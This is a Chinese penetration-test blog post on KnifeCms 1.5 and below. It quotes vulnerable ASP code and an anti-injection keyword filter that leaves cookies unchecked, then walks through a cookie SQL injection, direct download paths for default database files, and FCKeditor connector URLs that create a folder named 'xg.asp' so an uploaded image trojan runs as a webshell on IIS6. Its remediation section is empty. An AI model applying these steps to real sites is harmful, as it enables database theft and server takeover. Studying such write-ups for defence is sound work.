@@ -1,0 +1,177 @@
+← 卡奇娱乐 数据库下载漏洞KnifeCms Version<=1.5漏洞
+2012 年 6 月 3 日 Mix0xrn Penetration Test Go to comment 
+[本站所有文章均属原创文章,转载的请留下版权,谢谢.]
+[Mix0xrn@Dis9Team,小乖's Blog. 记录自己学习的点滴.]
+[If everything all me do whatever they want, i would have get lost the here free abyss feeling.]
+
+0×00 KnifeCms简介
+0×01 漏洞相关代码
+0×02 实现过程
+0×03 数据库下载
+0×04 拿WebShell
+0×05 修复建议
+
+0×00 KnifeCms简介
+KnifeCMS.ASP基于GPL协议开源
+如果您希望修改源码作为其他用途(包含商业用途)，您只需告知我们对源码所作的修改
+我们鼓励您对源码作出修改(自己动手丰衣足食)
+您不必告知我们作出的每个改动
+但如果您愿意花费宝贵的时间告知我们，我们会提供免费的在线技术支持!
+开发时间仓促，部分文档不是很详尽，敬请谅解!
+0×01 漏洞相关代码
+/page/doc.asp
+
+查看源代码打印帮助
+1 <!--#include virtual="/include/conn.asp"-->  
+
+2 <!--#include virtual="/include/function.asp"-->  
+
+3 <!--#include virtual="/include/page.asp"-->  
+
+4 <!--#include virtual="/include/config.asp"-->  
+
+5 <!--#include virtual="/include/template.asp"-->  
+
+6 <%  
+
+7 'if Channel(getCID(ID),"pageMode")=1 Then Response.Redirect "/page/list.asp?pageID="&pageID  
+
+8 Dim aTemplate  
+
+9 aTemplate = Channel(getCID(Request("ID")),"Template")  
+
+10 if len(aTemplate)> 0 then  
+
+11     ExeTemplate(aTemplate)  
+
+12 else 
+
+13     ExeTemplate("doc.shtml")  
+
+14 end if 
+
+15 %> 
+程序没有对放入sql语句中的变量aTemplate做过滤导致注入漏洞的产生。
+不过他在下面的代码里加了防注入.
+
+/include/conn.asp
+
+查看源代码打印帮助
+1 '===============================================================================  
+
+2 'SQL注入过滤  
+
+3 '2008-10-25  
+
+4 '===============================================================================  
+
+5 Dim QueryData,FormData,QueryName,Name  
+
+6 QueryData="'|''|;|,|*|%|and|exec|insert|select|update|delete|count|master|truncate|char|declare|where|set|declare|mid|chr|set|chr(37)|net" 
+
+7 FormData="" 
+
+8    
+
+9 '对 get query 值 的过滤.  
+
+10 if request.QueryString<>"" then  
+
+11     adoData=split(QueryData,"|")  
+
+12     FOR EACH QueryName IN Request.QueryString  
+
+13         for i=0 to ubound(adoData)  
+
+14             If Instr(LCase(request.QueryString(QueryName)),adoData(i))<>0 Then  
+
+15                 Response.Write "<Script Language=javascript>alert('请不要提交非法请求！');history.back(-1)</Script>" 
+
+16                 Response.end 
+
+17             End If  
+
+18         NEXT  
+
+19     NEXT  
+
+20 End if 
+
+21    
+
+22 '对 post 表 单值的过滤.  
+
+23 if request.form<>"" then  
+
+24     adoData=split(FormData,"|")  
+
+25     FOR EACH Name IN Request.Form  
+
+26         for i=0 to ubound(adoData)  
+
+27             If Instr(LCase(request.form(Name)),adoData(i))<>0 Then  
+
+28                 Response.Write "<Script Language=javascript>alert('请不要提交非法请求！');history.back(-1)</Script>" 
+
+29                 Response.end 
+
+30             End If  
+
+31         NEXT  
+
+32     NEXT  
+
+33 end if 
+
+34 %> 
+从这段防注入的代码可以看出,这套程序防Get和Post注入,但是唯独Cookies注入没有防.
+于是产生了Cookies注入.
+
+0×02 实现过程
+
+- -找到doc.asp?id=xx
+然后丢进穿山甲进行Cookies注入（效率比较低）,或者用刺猬那个Cookies中转注入生成的（效率不错）..
+
+http://www.h4x0er.com/page/doc.asp?ID=142
+
+加入
+表：
+db_system
+字段:
+username
+password
+- -貌似国内的Sql注入的都没这个表,自己手工加上来吧.
+
+下面是测试官网的图..
+
+由于没md5会员就不拿官网的webshell了..
+
+0×03 数据库下载
+
+http://www.h4x0er.com/_database/5d7525e61ca2ae39.mdb
+
+http://www.h4x0er.com/bbs/database/bbsxp2008_.mdb
+
+/_database
+这目录里还有其他一些坑爹的数据库- -估计防止别人扫描的..
+话说这套源码里还有集成bbsxp2008…还有其他一些神马的有兴趣的可以自己去下载一套来看看..作为源码分析还是不错的0.0~
+不过在官网呢,就貌似没这些默认数据库的路径.他都改了..
+
+0×04 拿Webshell
+
+Fckeditor这部分写的还是不错的,检验了admin是否登录了,才进行允许进行下一步操作..0.0~ 
+
+Fckeditor的版本是2.6.3
+以下是iis6+win2003拿webshell
+
+iis6的环境下可以这样.
+创建一个xg.asp的目录,
+
+查看源代码打印帮助
+1 http://www.h4x0er.com/fckeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/xg.asp&NewFolderName=x.asp 
+然后在这里上传jpg格式的图片木马.
+
+查看源代码打印帮助
+1 http://www.h4x0er.com/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.h4x0er.com/fckeditor%2Feditor%2Ffilemanager%2Fconnectors%2Fasp%2Fconnector.asp 
+0×05 修复建议
+
